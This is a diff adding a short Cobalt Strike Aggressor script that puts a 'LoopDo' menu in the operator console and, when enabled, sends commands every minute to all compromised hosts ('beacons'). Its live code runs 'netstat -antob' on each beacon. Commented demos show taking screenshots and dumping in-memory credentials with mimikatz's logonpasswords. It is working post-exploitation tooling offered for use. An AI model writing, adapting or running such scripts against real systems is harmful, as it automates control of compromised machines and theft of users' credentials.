@@ -1,0 +1,57 @@
+# author: arr0w1
+# do somethings every X minutes while enabled.(on all beacons)
+# for example, run the command 'xxx' every 1 minutes while (Replace 'xxx' with a custom command)
+
+
+$enabledsetting = 'false';
+
+sub your-settings {
+	@bids = $1;
+
+	$dialog = dialog("Loop Settings", %(enabled => $enabledsetting), lambda({
+		$enabledsetting = $3['enabled'];
+
+		}));
+
+	dialog_description($dialog, "do somethings every X minutes while enabled.(on all beacons)");
+	
+	drow_checkbox($dialog, "enabled", "Run the command 'xxx' every 1 minutes while - Enabled:");
+
+	dbutton_action($dialog, "Save");
+	
+	dialog_show($dialog);
+
+}
+
+
+on heartbeat_1m {
+	if ($enabledsetting eq 'true') {
+		foreach $beacon (beacons()) {
+			# get beacon id
+			$id = $beacon['id'];
+
+			# Demo1 - Ask Beacon to run a command with cmd.exe 
+			# The netstat command requires SYSTEM or Administrator permissions
+			# 'xxx'
+			bshell($id, "netstat -antob");
+
+			# Demo2 - Ask Beacon to run a command with cmd.exe
+			# binput($id, "screenshot");
+			# bscreenshot($id); 
+
+			# Demo3 - Ask Beacon to dump in-memory credentials with mimikatz
+			# binput($id, "logonpasswords");
+			# blogonpasswords($id);
+		}
+	}
+}
+
+# Define the top-level menubar
+menubar("LoopDo", "loop-settings", 2);
+
+# Define the popup button
+popup loop-settings {
+	item "Configure Settings" {
+		your-settings();
+	}
+}
